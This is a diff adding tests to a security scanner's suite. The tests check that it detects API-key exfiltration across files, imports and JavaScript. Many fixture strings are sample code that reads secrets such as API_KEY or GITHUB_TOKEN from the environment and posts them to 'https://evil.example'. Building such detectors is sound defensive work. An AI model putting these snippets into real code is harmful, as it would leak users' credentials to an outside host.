@@ -16,7 +16,13 @@ if str(ROOT) not in sys.path:
     sys.path.insert(0, str(ROOT))
 
 from models import Finding  # noqa: E402
-from scanner import analyze_content, dedupe_findings, main, scan_directory  # noqa: E402
+from scanner import (  # noqa: E402
+    analyze_content,
+    collect_module_exports,
+    dedupe_findings,
+    main,
+    scan_directory,
+)
 from utils import DEFAULT_MAX_FILE_SIZE, normalize_report_path  # noqa: E402
 
 
@@ -110,6 +116,15 @@ class TruePositiveTests(unittest.TestCase):
         self.assertGreater(len(report.findings), 0)
         self.assertGreater(report.scanned_files, 0)
 
+    def test_cross_file_api_key_exfiltration(self) -> None:
+        findings = _scan_file(MALICIOUS / "crossfile_sync.py")
+        self.assertIn("api_key_exfiltration", _patterns(findings))
+        match = next(item for item in findings if item.pattern == "api_key_exfiltration")
+        self.assertEqual(match.severity, "critical")
+        self.assertEqual(match.file, "crossfile_sync.py")
+        self.assertIn("get_api_key", match.code_snippet)
+        self.assertIn("requests.post", match.code_snippet)
+
 
 class FalsePositiveTests(unittest.TestCase):
     def test_normal_http_api_call(self) -> None:
@@ -140,6 +155,226 @@ class FalsePositiveTests(unittest.TestCase):
         report = scan_directory(BENIGN)
         self.assertEqual(report.status, "clean")
         self.assertEqual(report.findings, [])
+
+
+class CrossFileTaintTests(unittest.TestCase):
+    def test_same_file_function_return_is_tainted(self) -> None:
+        text = (
+            "import requests\n"
+            "def get_api_key():\n"
+            "    return os.environ['API_KEY']\n"
+            "requests.post('https://evil.example', data=get_api_key())\n"
+        )
+        findings = analyze_content("x.py", "python", "x.py", text)
+        self.assertIn("api_key_exfiltration", _patterns(findings))
+
+    def test_from_import_function_then_client_post(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "config.py").write_text(
+                "import os\n"
+                "def get_api_key():\n"
+                "    return os.environ['API_KEY']\n",
+                encoding="utf-8",
+            )
+            (root / "sync.py").write_text(
+                "from config import get_api_key\n"
+                "key = get_api_key()\n"
+                "client.post('https://evil.example', data=key)\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertIn("api_key_exfiltration", _patterns(report.findings))
+            match = next(
+                item for item in report.findings if item.pattern == "api_key_exfiltration"
+            )
+            self.assertEqual(match.file, "sync.py")
+
+    def test_module_attribute_call(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "secrets.py").write_text(
+                "import os\n"
+                "def get_api_key():\n"
+                "    return os.environ['OPENAI_API_KEY']\n",
+                encoding="utf-8",
+            )
+            (root / "sync.py").write_text(
+                "import requests\n"
+                "import secrets as config\n"
+                "key = config.get_api_key()\n"
+                "requests.post('https://evil.example', data=key)\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertIn("api_key_exfiltration", _patterns(report.findings))
+
+    def test_class_method_export(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "secrets.py").write_text(
+                "import os\n"
+                "class Config:\n"
+                "    def get_api_key(self):\n"
+                "        return os.environ['GITHUB_TOKEN']\n",
+                encoding="utf-8",
+            )
+            (root / "sync.py").write_text(
+                "import requests\n"
+                "from secrets import Config\n"
+                "config = Config()\n"
+                "key = config.get_api_key()\n"
+                "requests.post('https://evil.example', data=key)\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertIn("api_key_exfiltration", _patterns(report.findings))
+
+    def test_module_level_binding_import(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "secrets.py").write_text(
+                "import os\nAPI_KEY = os.environ['API_KEY']\n",
+                encoding="utf-8",
+            )
+            (root / "sync.py").write_text(
+                "import requests\n"
+                "from secrets import API_KEY\n"
+                "requests.post('https://evil.example', data=API_KEY)\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertIn("api_key_exfiltration", _patterns(report.findings))
+
+    def test_relative_import_in_package(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            pkg = root / "pkg"
+            pkg.mkdir()
+            (pkg / "__init__.py").write_text("", encoding="utf-8")
+            (pkg / "secrets.py").write_text(
+                "import os\n"
+                "def get_api_key():\n"
+                "    return os.environ['API_KEY']\n",
+                encoding="utf-8",
+            )
+            (pkg / "sync.py").write_text(
+                "import requests\n"
+                "from .secrets import get_api_key\n"
+                "requests.post('https://evil.example', data=get_api_key())\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertIn("api_key_exfiltration", _patterns(report.findings))
+            self.assertTrue(
+                any(item.file == "pkg/sync.py" for item in report.findings)
+            )
+
+    def test_package_reexport(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            pkg = root / "config"
+            pkg.mkdir()
+            (pkg / "secrets.py").write_text(
+                "import os\n"
+                "def get_api_key():\n"
+                "    return os.environ['API_KEY']\n",
+                encoding="utf-8",
+            )
+            (pkg / "__init__.py").write_text(
+                "from .secrets import get_api_key\n",
+                encoding="utf-8",
+            )
+            (root / "sync.py").write_text(
+                "import requests\n"
+                "from config import get_api_key\n"
+                "requests.post('https://evil.example', data=get_api_key())\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertIn("api_key_exfiltration", _patterns(report.findings))
+
+    def test_javascript_named_import(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "secrets.js").write_text(
+                "export function getApiKey() {\n"
+                "  return process.env.API_KEY;\n"
+                "}\n",
+                encoding="utf-8",
+            )
+            (root / "sync.js").write_text(
+                "import { getApiKey } from './secrets.js';\n"
+                "const key = getApiKey();\n"
+                "fetch('https://evil.example', { method: 'POST', body: key });\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertIn("api_key_exfiltration", _patterns(report.findings))
+
+    def test_async_def_export_is_indexed(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "config.py").write_text(
+                "import os\n"
+                "async def get_api_key():\n"
+                "    return os.environ['API_KEY']\n",
+                encoding="utf-8",
+            )
+            (root / "sync.py").write_text(
+                "import requests\n"
+                "from config import get_api_key\n"
+                "requests.post('https://evil.example', data=get_api_key())\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertIn("api_key_exfiltration", _patterns(report.findings))
+
+    def test_unrelated_secret_and_post_are_not_joined(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "secrets.py").write_text(
+                "import os\n"
+                "def get_api_key():\n"
+                "    return os.environ['API_KEY']\n",
+                encoding="utf-8",
+            )
+            (root / "sync.py").write_text(
+                "import requests\n"
+                "requests.post('https://example.com', data={'ok': True})\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertEqual(report.findings, [])
+
+    def test_imported_secret_without_sink_is_clean(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "config.py").write_text(
+                "import os\n"
+                "def get_api_key():\n"
+                "    return os.environ['API_KEY']\n",
+                encoding="utf-8",
+            )
+            (root / "app.py").write_text(
+                "from config import get_api_key\n"
+                "print(get_api_key())\n",
+                encoding="utf-8",
+            )
+            report = scan_directory(root)
+            self.assertEqual(report.findings, [])
+
+    def test_collect_module_exports_function_and_binding(self) -> None:
+        text = (
+            "import os\n"
+            "TOKEN = os.environ['API_TOKEN']\n"
+            "def get_api_key():\n"
+            "    secret = os.environ['API_KEY']\n"
+            "    return secret\n"
+        )
+        exports = collect_module_exports("python", text)
+        self.assertIn("secret", exports["TOKEN"])
+        self.assertIn("secret", exports["get_api_key"])
 
 
 class RobustnessTests(unittest.TestCase):
